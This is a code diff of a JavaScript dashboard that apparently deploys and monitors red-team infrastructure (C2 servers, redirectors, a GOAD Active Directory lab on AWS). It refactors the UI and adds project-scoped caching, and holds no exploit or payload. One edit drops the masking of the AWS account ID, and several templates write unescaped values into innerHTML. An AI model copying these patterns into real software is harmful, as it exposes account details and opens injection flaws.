                 <div style="color: var(--text-muted); font-size: 0.75em; margin-bottom: 6px;">Ansible Log (last 20 lines):</div>
                 <pre id="goad-panel-log-tail" style="color: var(--text-secondary); font-family: monospace; font-size: 0.8em; white-space: pre-wrap; max-height: 200px; overflow-y: auto; margin: 0;">${escapeHtml(logTail)}</pre>
             </div>` : '<div style="color: var(--text-muted); font-size: 0.88em;">Waiting for log output...</div>'}
@@ -6530,9 +12737,9 @@ function updateGoadProvisioningUI(provData, isRunning, logTail) {
                 Verify runs: your machine → SSH to jumpbox → WinRM ping to each AD VM
             </div>
             ${logTail ? `
-            <div style="background: var(--bg-terminal); border-radius: 6px; padding: 12px; margin-top: 8px;">
-                <div style="color: var(--danger-text); font-size: 0.75em; margin-bottom: 6px;">Last log output:</div>
-                <pre style="color: var(--danger-text); font-family: monospace; font-size: 0.8em; white-space: pre-wrap; max-height: 200px; overflow-y: auto; margin: 0;">${escapeHtml(logTail)}</pre>
+            <div class="terminal-block" style="margin-top: 8px;">
+                <div style="color: var(--text-terminal); font-size: 0.75em; margin-bottom: 6px;">Last log output:</div>
+                <pre style="color: var(--text-terminal); font-family: monospace; font-size: 0.8em; white-space: pre-wrap; max-height: 200px; overflow-y: auto; margin: 0;">${escapeHtml(logTail)}</pre>
             </div>` : ''}
             <div id="goad-verify-results"></div>
         `;
@@ -6717,7 +12924,7 @@ async function verifyGoadAD() {
             addDeploymentLog(`AD verification failed: ${data.error}`, 'error');
             if (resultsDiv) {
                 resultsDiv.innerHTML = `
-                    <div style="margin-top: 12px; color: var(--danger-text); background: var(--danger-bg); padding: 12px; border-radius: 6px;">
+                    <div class="alert-box alert-box--danger">
                         Verification failed: ${escapeHtml(data.error || 'Unknown error')}
                         ${data.details ? `<div style="margin-top: 6px; font-size: 0.88em; color: var(--text-secondary);">${escapeHtml(data.details)}</div>` : ''}
                     </div>
@@ -6728,7 +12935,7 @@ async function verifyGoadAD() {
         addDeploymentLog(`AD verification error: ${err.message}`, 'error');
         if (resultsDiv) {
             resultsDiv.innerHTML = `
-                <div style="margin-top: 12px; color: var(--danger-text); background: var(--danger-bg); padding: 12px; border-radius: 6px;">
+                <div class="alert-box alert-box--danger">
                     Error connecting to API: ${escapeHtml(err.message)}
                 </div>
             `;
@@ -6745,19 +12952,23 @@ async function verifyGoadAD() {
  */
 async function loadDeploymentsPage() {
     console.log('Loading Deployments page...');
-    
-    // Show sections immediately (they start hidden)
-    const resourceSection = document.getElementById('resource-list-section');
+
+    // Only show deployment-history immediately (always relevant).
+    // Other sections are shown by refreshDeployments() once we know there's an active deployment,
+    // avoiding the flash-then-hide layout shift when no deployment exists.
     const historySection = document.getElementById('deployment-history-section');
-    if (resourceSection) resourceSection.style.display = 'block';
     if (historySection) historySection.style.display = 'block';
-    
-    // Load all data in parallel for faster page load
+
+    // Load everything in parallel — history renders immediately from localStorage,
+    // then re-renders after server merge. Infrastructure data loads in parallel.
     await Promise.all([
         refreshDeployments(),
         loadResourceList(),
-        loadDeploymentHistory()
+        loadDeploymentHistory(),
+        loadBudgetAlert(),
     ]);
+    // Re-render timeline so deployment cards can lazy-load per-project data
+    renderDeploymentTimeline();
 }
 
 // Flag to suppress per-section toasts during bulk refresh
@@ -6768,14 +12979,14 @@ let _suppressSectionToasts = false;
  * Single entry point for the "Refresh All" button.
  * Uses force-fetch for resources (bypasses cache) since the user explicitly asked to refresh.
  */
-async function refreshAll() {
+async function refreshAll({ silent = false } = {}) {
     const lastUpdatedSpan = document.getElementById('deployments-last-updated');
-    if (lastUpdatedSpan) {
+    if (lastUpdatedSpan && !silent) {
         lastUpdatedSpan.textContent = 'Refreshing all sections...';
     }
 
     const refreshBtn = document.getElementById('refresh-all-btn');
-    if (refreshBtn) {
+    if (refreshBtn && !silent) {
         refreshBtn.disabled = true;
         refreshBtn.textContent = 'Refreshing...';
     }
@@ -6785,9 +12996,15 @@ async function refreshAll() {
         await Promise.all([
             refreshDeployments(),
             refreshResourceList(),
-            loadDeploymentHistory()
+            loadDeploymentHistory(),
+            loadBudgetAlert(),
+            loadCachedSetupCheck(),
         ]);
-        showMessage('All sections refreshed', 'success');
+        // Re-render timeline so deployment cards can lazy-load per-project data
+        renderDeploymentTimeline();
+        if (!silent) {
+            showMessage('All sections refreshed', 'success');
+        }
         if (lastUpdatedSpan) {
             lastUpdatedSpan.textContent = `Last updated: ${new Date().toLocaleTimeString()}`;
         }
@@ -6826,15 +13043,26 @@ async function refreshDeployments() {
     }
     
     try {
-        // Fetch both C2 infrastructure and GOAD status
-        const [infraResponse, goadResponse] = await Promise.all([
+        // Fetch GOAD status and SSH key info in parallel
+        // Per-project infra/config data is now lazy-loaded via loadProjectData()
+        const [infraResponse, goadResponse, sshKeyResponse] = await Promise.all([
             fetch(`${API_BASE}/deploy/infrastructure`),
-            fetch(`${API_BASE}/goad/status`)
+            fetch(`${API_BASE}/goad/status`),
+            fetch(`${API_BASE}/deploy/ssh-public-key`).catch(() => null),
         ]);
-        
+
         const data = await infraResponse.json();
         const goadData = await goadResponse.json();
-        
+
+        // Cache SSH key info for connection info rendering (user-global)
+        try {
+            if (sshKeyResponse && sshKeyResponse.ok) {
+                const sshData = await sshKeyResponse.json();
+                cachedSshKeyData = (sshData.success && sshData.has_key) ? sshData : null;
+            }
+        } catch (e) { cachedSshKeyData = null; }
+        try { localStorage.setItem('red_team_cached_ssh_key', cachedSshKeyData ? JSON.stringify(cachedSshKeyData) : ''); } catch {}
+
         // Update last updated time
         if (lastUpdatedSpan) {
             lastUpdatedSpan.textContent = `Last updated: ${new Date().toLocaleTimeString()}`;
@@ -6855,13 +13083,16 @@ async function refreshDeployments() {
         }
         
         if (!hasAnyDeployment) {
-            // No deployment - show empty state
+            // No deployment - show empty state, clear cached data from localStorage
+            try { localStorage.removeItem('red_team_project_cache'); localStorage.removeItem('red_team_cached_ssh_key'); } catch {}
+            projectDataCache = {};
             hideAllInfrastructureSections();
             if (noDeploymentDiv) noDeploymentDiv.style.display = 'block';
             if (overviewDiv) overviewDiv.innerHTML = '';
-            document.getElementById('connection-info-section').style.display = 'none';
-            document.getElementById('destroy-section').style.display = 'none';
-            document.getElementById('goad-lab-section').style.display = 'none';
+            const destroySection = document.getElementById('destroy-section');
+            if (destroySection) destroySection.style.display = 'none';
+            const goadSection = document.getElementById('goad-lab-section');
+            if (goadSection) goadSection.style.display = 'none';
             // Hide lifecycle section when no deployment
             const lifecycleSection = document.getElementById('lifecycle-section');
             if (lifecycleSection) lifecycleSection.style.display = 'none';
@@ -6871,85 +13102,17 @@ async function refreshDeployments() {
         // Has deployment - show infrastructure
         if (noDeploymentDiv) noDeploymentDiv.style.display = 'none';
         
-        // Show lifecycle section and update project tag
-        const lifecycleSection = document.getElementById('lifecycle-section');
-        if (lifecycleSection) {
-            lifecycleSection.style.display = 'block';
-            // Update the project tag display
-            const projectTagSpan = document.getElementById('aws-project-tag');
-            if (projectTagSpan && data.success) {
-                // Try to get project name from config or use a default
-                projectTagSpan.textContent = data.project_name || 'your-project-name';
-            }
-        }
+        // Lifecycle section already shown by loadDeploymentsPage()
         
         // Show destroy section
-        document.getElementById('destroy-section').style.display = 'block';
+        const destroySec = document.getElementById('destroy-section');
+        if (destroySec) destroySec.style.display = 'block';
         
-        // Build overview summary including GOAD
-        const summary = data.success && data.has_deployment ? (data.summary || {}) : {};
-        const goadInfo = hasGoadDeployment ? goadData.deployment_info?.lab_info : null;
-        
-        let overviewHtml = `
-            <div class="status-display success">
-                <p><strong>✅ Infrastructure Active</strong></p>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px; margin-top: 15px;">
-        `;
-        
-        if (hasC2Deployment) {
-            overviewHtml += `
-                    <div style="text-align: center; padding: 15px; background: var(--bg-card); border-radius: 8px;">
-                        <div style="font-size: 2em; font-weight: bold; color: var(--danger-text);">${summary.c2_server_count || 0}</div>
-                        <div style="color: var(--text-secondary); font-size: 0.9em;">C2 Servers</div>
-                    </div>
-                    <div style="text-align: center; padding: 15px; background: var(--bg-card); border-radius: 8px;">
-                        <div style="font-size: 2em; font-weight: bold; color: var(--success-text);">${summary.redirector_count || 0}</div>
-                        <div style="color: var(--text-secondary); font-size: 0.9em;">Redirectors</div>
-                    </div>
-                    <div style="text-align: center; padding: 15px; background: var(--bg-card); border-radius: 8px;">
-                        <div style="font-size: 2em; font-weight: bold; color: var(--info-text);">${summary.has_bastion ? '1' : '0'}</div>
-                        <div style="color: var(--text-secondary); font-size: 0.9em;">Bastion Host</div>
-                    </div>
-            `;
-        }
-        
-        if (hasGoadDeployment && goadInfo) {
-            overviewHtml += `
-                    <div style="text-align: center; padding: 15px; background: var(--bg-card); border-radius: 8px; border: 2px solid var(--warning);">
-                        <div style="font-size: 2em; font-weight: bold; color: var(--warning-text);">${goadInfo.vms || 0}</div>
-                        <div style="color: var(--text-secondary); font-size: 0.9em;">GOAD VMs</div>
-                    </div>
-            `;
-        }
-        
-        overviewHtml += `
-                </div>
-        `;
-        
-        if (hasC2Deployment) {
-            overviewHtml += `<p style="margin-top: 15px; color: var(--text-secondary);"><strong>C2 Deployment Mode:</strong> ${data.deployment_mode || 'N/A'}</p>`;
-        }
-        if (hasGoadDeployment) {
-            overviewHtml += `<p style="margin-top: 5px; color: var(--text-secondary);"><strong>GOAD Lab:</strong> ${goadData.deployed_lab || 'N/A'}</p>`;
-        }
-        
-        overviewHtml += `</div>`;
-        overviewDiv.innerHTML = overviewHtml;
+        overviewDiv.innerHTML = '';
 
         // Check for stopped instances and show warning banner
         checkInstanceStates(data.project_name || '');
 
-        // Populate C2 sections if we have C2 deployment
-        if (hasC2Deployment) {
-            populateBastionSection(data.bastion);
-            populateC2ServersSection(data.c2_servers, data.deployment_mode);
-            populateRedirectorsSection(data.redirectors);
-            populateNetworkSection(data.network, data.security_groups);
-            await populateConnectionInfo(data);
-        } else {
-            hideAllInfrastructureSections();
-        }
-        
         // Populate GOAD section with already-fetched data (don't call loadGoadStatus again)
         populateGoadSection(goadData);
         
@@ -6958,7 +13121,10 @@ async function refreshDeployments() {
         if (destroySection) {
             destroySection.style.display = hasAnyDeployment ? 'block' : 'none';
         }
-        
+
+        // Re-render timeline so deployment cards can lazy-load per-project data.
+        renderDeploymentTimeline();
+
     } catch (error) {
         console.error('Error loading deployments:', error);
         if (overviewDiv) {
@@ -6998,7 +13164,7 @@ async function checkInstanceStates(projectName) {
         bannerDiv.innerHTML = `
             <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                 <div>
-                    <strong style="color: var(--warning-text);">&#9724; ${stoppedCount} of ${totalActive} instance${totalActive !== 1 ? 's' : ''} stopped</strong>
+                    <strong class="t-warning">&#9724; ${stoppedCount} of ${totalActive} instance${totalActive !== 1 ? 's' : ''} stopped</strong>
                     <span style="color: var(--text-muted); font-size: 0.88em; margin-left: 8px;">${instanceNames}</span>
                 </div>
                 <button class="btn" onclick="startInfrastructure()" style="background: var(--success); color: var(--text-primary); font-size: 0.88em; padding: 6px 14px;">
@@ -7039,7 +13205,7 @@ async function checkInstanceStates(projectName) {
  * Hide all infrastructure sections
  */
 function hideAllInfrastructureSections() {
-    const sections = ['bastion-section', 'c2-servers-section', 'redirectors-section', 'network-section'];
+    const sections = ['network-section'];
     sections.forEach(id => {
         const el = document.getElementById(id);
         if (el) el.style.display = 'none';
@@ -7052,7 +13218,56 @@ function hideAllInfrastructureSections() {
 
 // Store all resources for filtering
 let allResources = [];
+// Per-project cache: { [projectName]: { outputs, bastion, c2_servers, redirectors, attack_box, config } }
+let projectDataCache = (() => { try { const v = localStorage.getItem('red_team_project_cache'); return v ? JSON.parse(v) : {}; } catch { return {}; } })();
+// SSH key data is user-global (same key for all projects)
+let cachedSshKeyData = (() => { try { const v = localStorage.getItem('red_team_cached_ssh_key'); return v ? JSON.parse(v) : null; } catch { return null; } })();
+// Keep old globals for backward compat during migration
+let cachedInfraData = null;
+let cachedConfigData = null;
+
+function getProjectData(projectName) {
+    return projectDataCache[projectName] || null;
+}
+function setProjectData(projectName, data) {
+    projectDataCache[projectName] = data;
+    try { localStorage.setItem('red_team_project_cache', JSON.stringify(projectDataCache)); } catch {}
+}
+const SSL_CACHE_PREFIX = 'red_team_ssl_status_cache_';
+let cachedSSLStatusData = null;
+let cachedSSLStatusTime = null;
+let cachedSSLProjectName = null;
+
+function _sslCacheKey(project) {
+    return SSL_CACHE_PREFIX + (project || 'unknown');
+}
+
+function _restoreSSLCache(project) {
+    cachedSSLStatusData = null;
+    cachedSSLStatusTime = null;
+    cachedSSLProjectName = project;
+    try {
+        const saved = JSON.parse(localStorage.getItem(_sslCacheKey(project)));
+        if (saved && saved.html && saved.time) {
+            cachedSSLStatusData = saved.html;
+            cachedSSLStatusTime = new Date(saved.time);
+        }
+    } catch (e) { /* ignore */ }
+}
+
 const RESOURCES_CACHE_KEY = 'red_team_resources_cache';
+
+/**
+ * Get the current project name from infrastructure data or the config input.
+ * Used to scope the resource cache so stale data from a previous project
+ * doesn't flash on page load.
+ */
+function getCurrentProjectName() {
+    if (window.currentDeploymentProject) return window.currentDeploymentProject;
+    const input = document.getElementById('project-name');
+    if (input && input.value.trim()) return input.value.trim();
+    return '';
+}
 
 /**
  * Format a timestamp for display (e.g. "18:44:33" or "2 min ago")
@@ -7073,11 +13288,11 @@ function updateResourceScopeInfo(data, isCached) {
     const scopeDiv = document.getElementById('resource-scope-info');
     if (!scopeDiv) return;
     const acct = data.account_id || 'unknown';
-    const maskedAcct = acct.length > 4 ? '****' + acct.slice(-4) : acct;
+    const maskedAcct = acct;
     const timeStr = formatResourceTimestamp(data.timestamp);
 
     if (isCached) {
-        scopeDiv.innerHTML = `<span style="background: var(--warning); color: var(--text-inverse); padding: 2px 8px; border-radius: 4px; font-size: 0.88em; font-weight: 600;">CACHED</span> Account <strong>${maskedAcct}</strong> &middot; eu-central-1 &middot; Last checked <strong>${timeStr}</strong> &middot; <span style="color: var(--text-muted);">Refreshing...</span>`;
+        scopeDiv.innerHTML = `<span style="background: var(--warning); color: var(--text-inverse); padding: 2px 8px; border-radius: 4px; font-size: 0.88em; font-weight: 600;">CACHED</span> Account <strong>${maskedAcct}</strong> &middot; eu-central-1 &middot; Last checked <strong>${timeStr}</strong> &middot; <span class="t-muted">Refreshing...</span>`;
     } else {
         scopeDiv.innerHTML = `<span style="background: var(--success); color: var(--text-inverse); padding: 2px 8px; border-radius: 4px; font-size: 0.88em; font-weight: 600;">LIVE</span> Account <strong>${maskedAcct}</strong> &middot; eu-central-1 &middot; Updated <strong>${timeStr}</strong>`;
     }
@@ -7098,13 +13313,14 @@ function applyResourceData(data, isCached) {
     updateResourceScopeInfo(data, isCached);
 
     if (allResources.length === 0) {
-        tableBody.innerHTML = `<tr><td colspan="6" style="padding: 20px; text-align: center; color: var(--text-secondary);">No deployed resources</td></tr>`;
+        tableBody.innerHTML = `<div style="padding: 20px; text-align: center; color: var(--text-secondary);">No deployed resources</div>`;
         if (countDiv) countDiv.textContent = '0 resources';
         return;
     }
 
     section.style.display = 'block';
-    renderResourceTable(allResources);
+    // Respect active filter/search state instead of always showing all resources.
+    filterResources();
 }
 
 /**
@@ -7118,6 +13334,7 @@ function saveResourceCache(data) {
             regions_with_resources: data.regions_with_resources || [],
             account_id: data.account_id || '',
             user_arn: data.user_arn || '',
+            project_name: getCurrentProjectName(),
             timestamp: Date.now()
         };
         localStorage.setItem(RESOURCES_CACHE_KEY, JSON.stringify(cacheEntry));
@@ -7133,7 +13350,14 @@ function loadResourceCache() {
     try {
         const raw = localStorage.getItem(RESOURCES_CACHE_KEY);
         if (!raw) return null;
-        return JSON.parse(raw);
+        const cached = JSON.parse(raw);
+        // Invalidate cache if it belongs to a different project
+        const currentProject = getCurrentProjectName();
+        if (currentProject && cached.project_name && cached.project_name !== currentProject) {
+            localStorage.removeItem(RESOURCES_CACHE_KEY);
+            return null;
+        }
+        return cached;
     } catch (e) {
         return null;
     }
@@ -7152,7 +13376,7 @@ async function loadResourceList() {
     if (cached) {
         applyResourceData(cached, true);
     } else {
-        tableBody.innerHTML = `<tr><td colspan="7" style="padding: 20px; text-align: center; color: var(--text-muted);"><div class="spinner" style="display: inline-block; margin-right: 8px;"></div>Loading resources (eu-central-1)...</td></tr>`;
+        tableBody.innerHTML = `<div style="padding: 20px; text-align: center; color: var(--text-muted);"><div class="spinner" style="display: inline-block; margin-right: 8px;"></div>Loading resources (eu-central-1)...</div>`;
     }
 
     // 2. Fetch fresh data in background
@@ -7165,9 +13389,9 @@ async function loadResourceList() {
             if (cached) {
                 updateResourceScopeInfo(cached, false);
                 const scopeDiv = document.getElementById('resource-scope-info');
-                if (scopeDiv) scopeDiv.innerHTML += ` <span style="color: var(--danger-text);">&middot; Refresh failed</span>`;
+                if (scopeDiv) scopeDiv.innerHTML += ` <span class="t-danger">&middot; Refresh failed</span>`;
             } else {
-                tableBody.innerHTML = `<tr><td colspan="7" style="padding: 20px; text-align: center; color: var(--text-secondary);">No resources found or error loading resources</td></tr>`;
+                tableBody.innerHTML = `<div style="padding: 20px; text-align: center; color: var(--text-secondary);">No resources found or error loading resources</div>`;
             }
             return;
         }
@@ -7183,9 +13407,9 @@ async function loadResourceList() {
         if (cached) {
             updateResourceScopeInfo(cached, false);
             const scopeDiv = document.getElementById('resource-scope-info');
-            if (scopeDiv) scopeDiv.innerHTML += ` <span style="color: var(--danger-text);">&middot; Refresh failed: ${error.message}</span>`;
+            if (scopeDiv) scopeDiv.innerHTML += ` <span class="t-danger">&middot; Refresh failed: ${error.message}</span>`;
         } else {
-            tableBody.innerHTML = `<tr><td colspan="7" style="padding: 20px; text-align: center; color: var(--danger-text);">Error loading resources: ${error.message}</td></tr>`;
+            tableBody.innerHTML = `<div style="padding: 20px; text-align: center; color: var(--danger-text);">Error loading resources: ${error.message}</div>`;
         }
     }
 }
@@ -7196,81 +13420,60 @@ async function loadResourceList() {
 function renderResourceTable(resources) {
     const tableBody = document.getElementById('resource-table-body');
     const countDiv = document.getElementById('resource-count');
-    
+
     if (!tableBody) return;
-    
+
     // Filter out deleted/terminated resources - they no longer exist
     const activeResources = resources.filter(r => {
         const state = (r.state || '').toLowerCase();
         return state !== 'deleted' && state !== 'terminated' && state !== 'deleting';
     });
-    
-    // Group resources by project for the purge buttons
-    const projectGroups = {};
-    activeResources.forEach(r => {
-        const project = r.project || 'unknown';
-        if (!projectGroups[project]) {
-            projectGroups[project] = [];
-        }
-        projectGroups[project].push(r);
-    });
-    
-    const typeIcons = {
-        'ec2': '🖥️',
-        'vpc': '🌐',
-        'subnet': '📡',
-        'sg': '🔒',
-        'eip': '🔗',
-        'nat': '🚪',
-        's3': '📦',
-        'igw': '🌍',
-        'rtb': '🛣️',
-        'eni': '🔌',
-        'keypair': '🔑',
-        'pcx': '🔀',
-        'iam-role': '👤',
-        'iam-profile': '🎭',
-        'route53-zone': '🌐',
-        'acm-cert': '🔐'
+
+    const stateBadge = (state) => {
+        const s = (state || 'unknown').toLowerCase();
+        const colors = {
+            'running': { bg: 'var(--success-bg)', text: 'var(--success-text)', border: 'var(--success-border)' },
+            'available': { bg: 'var(--success-bg)', text: 'var(--success-text)', border: 'var(--success-border)' },
+            'active': { bg: 'var(--success-bg)', text: 'var(--success-text)', border: 'var(--success-border)' },
+            'stopped': { bg: 'var(--warning-bg)', text: 'var(--warning-text)', border: 'var(--warning-border)' },
+            'pending': { bg: 'var(--info-bg)', text: 'var(--info-text)', border: 'var(--info-border)' },
+            'terminated': { bg: 'var(--danger-bg)', text: 'var(--danger-text)', border: 'var(--danger-border)' },
+            'deleted': { bg: 'var(--danger-bg)', text: 'var(--danger-text)', border: 'var(--danger-border)' }
+        };
+        const c = colors[s] || { bg: 'var(--bg-section)', text: 'var(--text-secondary)', border: 'var(--border)' };
+        return `<span style="background: ${c.bg}; color: ${c.text}; border: 1px solid ${c.border}; padding: 2px 8px; border-radius: 10px; font-size: 0.82em; text-transform: uppercase; font-weight: 500;">${state || 'unknown'}</span>`;
     };
-    
-    const stateColors = {
-        'running': 'var(--success-text)',
-        'available': 'var(--success-text)',
-        'active': 'var(--success-text)',
-        'stopped': 'var(--warning-text)',
-        'pending': 'var(--info-text)',
-        'terminated': 'var(--danger-text)',
-        'deleted': 'var(--danger-text)'
-    };
-    
+
     if (activeResources.length === 0) {
-        tableBody.innerHTML = `<tr><td colspan="6" style="padding: 20px; text-align: center; color: var(--text-secondary);">No active resources</td></tr>`;
-        countDiv.textContent = '0 resources';
+        tableBody.innerHTML = `<div style="padding: 20px; text-align: center; color: var(--text-secondary);">No active resources</div>`;
+        if (countDiv) countDiv.textContent = '0 resources';
         return;
     }
 
     tableBody.innerHTML = activeResources.map((r, idx) => `
-        <tr style="background: ${idx % 2 === 0 ? 'var(--bg-card)' : 'var(--bg-section)'};">
-            <td style="padding: 10px; border-bottom: 1px solid var(--border);">
-                <span style="font-size: 1.2em;">${typeIcons[r.type] || '📄'}</span>
-                <span style="margin-left: 5px; text-transform: uppercase; font-size: 0.88em; color: var(--text-secondary);">${r.type}</span>
-            </td>
-            <td style="padding: 10px; border-bottom: 1px solid var(--border); font-weight: 500;">${r.name || '-'}</td>
-            <td style="padding: 10px; border-bottom: 1px solid var(--border);">
-                <code style="background: var(--bg-terminal); padding: 3px 8px; border-radius: 3px; font-size: 0.88em;">${r.id || '-'}</code>
-            </td>
-            <td style="padding: 10px; border-bottom: 1px solid var(--border);">
-                <span style="background: ${stateColors[r.state?.toLowerCase()] || 'var(--text-muted)'}; color: var(--text-primary); padding: 3px 10px; border-radius: 12px; font-size: 0.88em; text-transform: uppercase;">${r.state || 'unknown'}</span>
-            </td>
-            <td style="padding: 10px; border-bottom: 1px solid var(--border); font-size: 0.88em; color: var(--info-text);">
-                ${r.project ? `<a href="#" onclick="event.preventDefault(); purgeFailedDeployment('${r.project}')" style="background: var(--info-bg); padding: 3px 8px; border-radius: 4px; text-decoration: none; cursor: pointer;" title="Click to purge this project">${r.project}</a>` : '-'}
-            </td>
-            <td style="padding: 10px; border-bottom: 1px solid var(--border); font-size: 0.88em; color: var(--text-secondary);">${r.details || '-'}</td>
-        </tr>
+        <div class="resource-row" style="border-bottom: 1px solid var(--border); background: ${idx % 2 === 0 ? 'var(--bg-card)' : 'var(--bg-section)'};">
+            <div class="resource-row-summary" onclick="this.parentElement.classList.toggle('expanded')" style="display: flex; align-items: center; padding: 10px 14px; cursor: pointer; gap: 12px; user-select: none;">
+                <span style="flex-shrink: 0;">${awsIcon(r.type, 22)}</span>
+                <span style="text-transform: uppercase; font-size: 0.82em; color: var(--text-secondary); width: 70px; flex-shrink: 0;">${r.type}</span>
+                <span style="font-weight: 500; flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${r.name || '-'}</span>
+                ${stateBadge(r.state)}
+                <span style="color: var(--text-muted); font-size: 0.85em; transition: transform 0.2s;" class="resource-chevron">&#9662;</span>
+            </div>
+            <div class="resource-row-details" style="display: none; padding: 0 14px 12px 14px; font-size: 0.88em;">
+                <div style="display: grid; grid-template-columns: auto 1fr; gap: 6px 14px; padding: 10px 12px; background: var(--bg-elevated); border-radius: 6px;">
+                    <span class="t-muted">Resource ID</span>
+                    <code style="color: var(--text-primary); background: var(--bg-input); padding: 2px 6px; border-radius: 3px; font-size: 0.92em; border: 1px solid var(--border);">${r.id || '-'}</code>
+                    <span class="t-muted">State</span>
+                    <span>${stateBadge(r.state)}</span>
+                    <span class="t-muted">Project</span>
+                    <span>${r.project ? `<a href="#" onclick="event.preventDefault(); event.stopPropagation(); showDestroyConfirmation('${r.project}', 'purge')" style="color: var(--info-text); text-decoration: underline;" title="Click to purge this project">${r.project}</a>` : '-'}</span>
+                    ${r.details ? `<span class="t-muted">Details</span><span class="t-secondary">${r.details}</span>` : ''}
+                </div>
+            </div>
+        </div>
     `).join('');
 
-    countDiv.textContent = `${activeResources.length} resource${activeResources.length !== 1 ? 's' : ''} found`;
+    if (countDiv) countDiv.textContent = `${activeResources.length} resource${activeResources.length !== 1 ? 's' : ''} found`;
 }
 
 /**
@@ -7303,8 +13506,8 @@ function filterResources() {
 async function refreshResourceList() {
     const tableBody = document.getElementById('resource-table-body');
     const scopeDiv = document.getElementById('resource-scope-info');
-    if (tableBody) tableBody.innerHTML = `<tr><td colspan="7" style="padding: 20px; text-align: center; color: var(--text-muted);"><div class="spinner" style="display: inline-block; margin-right: 8px;"></div>Loading resources (eu-central-1)...</td></tr>`;
-    if (scopeDiv) scopeDiv.innerHTML = '<span style="color: var(--text-muted);">Refreshing...</span>';
+    if (tableBody) tableBody.innerHTML = `<div style="padding: 20px; text-align: center; color: var(--text-muted);"><div class="spinner" style="display: inline-block; margin-right: 8px;"></div>Loading resources (eu-central-1)...</div>`;
+    if (scopeDiv) scopeDiv.innerHTML = '<span class="t-muted">Refreshing...</span>';
 
     try {
         const response = await fetch(`${API_BASE}/deploy/resources`);
@@ -7367,31 +13570,113 @@ function exportResourceList() {
 // DEPLOYMENT HISTORY & LOGS FUNCTIONS
 // =============================================================================
 
-// Store deployment logs in memory and localStorage
+// Store deployment logs in memory and localStorage (project-scoped)
 let deploymentLogs = [];
 let archivedLogs = [];
-const LOGS_STORAGE_KEY = 'red_team_deployment_logs';
-const ARCHIVED_LOGS_KEY = 'red_team_archived_logs';
+const LOGS_STORAGE_KEY_PREFIX = 'red_team_deployment_logs';
+const ARCHIVED_LOGS_KEY_PREFIX = 'red_team_archived_logs';
 const MAX_LOGS = 500;
 const MAX_ARCHIVED = 2000;
 
 /**
+ * Get the current project name for scoping localStorage keys.
+ * Falls back through: window.currentDeploymentProject -> sessionStorage.
+ */
+function _getLogsProjectName() {
+    return window.currentDeploymentProject
+        || sessionStorage.getItem('activeDeploymentProject')
+        || null;
+}
+
+/**
+ * Build project-scoped localStorage key.
+ * If no project is active, falls back to the base prefix (global).
+ */
+function getLogsStorageKey() {
+    const proj = _getLogsProjectName();
+    return proj ? `${LOGS_STORAGE_KEY_PREFIX}_${proj}` : LOGS_STORAGE_KEY_PREFIX;
+}
+function getArchivedLogsKey() {
+    const proj = _getLogsProjectName();
+    return proj ? `${ARCHIVED_LOGS_KEY_PREFIX}_${proj}` : ARCHIVED_LOGS_KEY_PREFIX;
+}
+function getClearedAtKey() {
+    const proj = _getLogsProjectName();
+    return proj ? `red_team_logs_cleared_at_${proj}` : 'red_team_logs_cleared_at';
+}
+
+/**
  * Initialize deployment logs from localStorage
  */
+let _logsInitialized = false;
+let _logsInitializedForProject = null;
 function initDeploymentLogs() {
+    // Re-parse localStorage when the active project changes so we load
+    // the correct project-scoped log set.
+    const currentProject = _getLogsProjectName();
+    if (_logsInitialized && _logsInitializedForProject === currentProject) return;
+    _logsInitialized = true;
+    _logsInitializedForProject = currentProject;
     try {
-        const stored = localStorage.getItem(LOGS_STORAGE_KEY);
+        // Migrate legacy global keys into the current project scope (one-time).
+        _migrateLegacyLogs(currentProject);
+
+        const stored = localStorage.getItem(getLogsStorageKey());
         if (stored) {
             deploymentLogs = JSON.parse(stored);
+        } else {
+            deploymentLogs = [];
         }
         // Also load archived logs
-        const archived = localStorage.getItem(ARCHIVED_LOGS_KEY);
+        const archived = localStorage.getItem(getArchivedLogsKey());
         if (archived) {
             archivedLogs = JSON.parse(archived);
+        } else {
+            archivedLogs = [];
         }
     } catch (e) {
         console.error('Error loading deployment logs:', e);
         deploymentLogs = [];
+        archivedLogs = [];
+    }
+}
+
+/**
+ * One-time migration: move logs from old global keys into the current
+ * project-scoped keys, then remove the old keys so they don't leak again.
+ */
+function _migrateLegacyLogs(currentProject) {
+    if (!currentProject) return; // No project yet — nothing to migrate into
+    const oldLogsKey = LOGS_STORAGE_KEY_PREFIX;           // was the old constant
+    const oldArchivedKey = ARCHIVED_LOGS_KEY_PREFIX;      // was the old constant
+    const newLogsKey = getLogsStorageKey();
+    const newArchivedKey = getArchivedLogsKey();
+    // Only migrate if the old global key exists and the new scoped key doesn't yet
+    try {
+        const oldLogs = localStorage.getItem(oldLogsKey);
+        if (oldLogs && !localStorage.getItem(newLogsKey)) {
+            localStorage.setItem(newLogsKey, oldLogs);
+        }
+        // Always remove old global key after migration attempt
+        if (oldLogs && newLogsKey !== oldLogsKey) {
+            localStorage.removeItem(oldLogsKey);
+        }
+        const oldArchived = localStorage.getItem(oldArchivedKey);
+        if (oldArchived && !localStorage.getItem(newArchivedKey)) {
+            localStorage.setItem(newArchivedKey, oldArchived);
+        }
+        if (oldArchived && newArchivedKey !== oldArchivedKey) {
+            localStorage.removeItem(oldArchivedKey);
+        }
+        // Also migrate the cleared-at timestamp
+        const oldCleared = localStorage.getItem('red_team_logs_cleared_at');
+        const newClearedKey = getClearedAtKey();
+        if (oldCleared && !localStorage.getItem(newClearedKey) && newClearedKey !== 'red_team_logs_cleared_at') {
+            localStorage.setItem(newClearedKey, oldCleared);
+            localStorage.removeItem('red_team_logs_cleared_at');
+        }
+    } catch (e) {
+        console.warn('Legacy log migration failed:', e);
     }
 }
 
@@ -7404,7 +13689,7 @@ function saveDeploymentLogs() {
         if (deploymentLogs.length > MAX_LOGS) {
             deploymentLogs = deploymentLogs.slice(-MAX_LOGS);
         }
-        localStorage.setItem(LOGS_STORAGE_KEY, JSON.stringify(deploymentLogs));
+        localStorage.setItem(getLogsStorageKey(), JSON.stringify(deploymentLogs));
     } catch (e) {
         console.error('Error saving deployment logs:', e);
     }
@@ -7419,7 +13704,7 @@ function saveArchivedLogs() {
         if (archivedLogs.length > MAX_ARCHIVED) {
             archivedLogs = archivedLogs.slice(-MAX_ARCHIVED);
         }
-        localStorage.setItem(ARCHIVED_LOGS_KEY, JSON.stringify(archivedLogs));
